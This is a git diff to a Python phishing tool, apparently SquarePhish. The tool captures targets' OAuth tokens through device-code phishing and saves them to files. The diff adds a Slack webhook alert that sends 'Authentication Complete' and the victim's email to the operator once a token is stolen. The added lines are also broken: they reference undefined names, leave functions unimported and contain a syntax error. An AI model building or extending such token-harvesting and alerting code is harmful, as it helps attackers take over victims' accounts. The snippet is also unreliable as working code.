@@ -18,6 +18,7 @@ import requests
 import logging
 import datetime
 import threading
+import slack_notifications
 from squarephish.utils import HTTP_HEADERS
 
 
@@ -89,7 +90,8 @@ class AuthPoll(threading.Thread):
         try:
             with open(f"{self.target_email}.tokeninfo.json", "w") as f:
                 json.dump(tokenResponse, f)
-
+            webhook_client = WebhookClient(config.get("SLACK_WEBHOOK", val))
+            notify_slack(webhook_client,"Authentication Complete",IP=None,useragent=None,email)
             logging.info(f"[{self.target_email}] Token info saved to {self.target_email}.tokeninfo.json")  # fmt: skip
 
         except Exception as e:
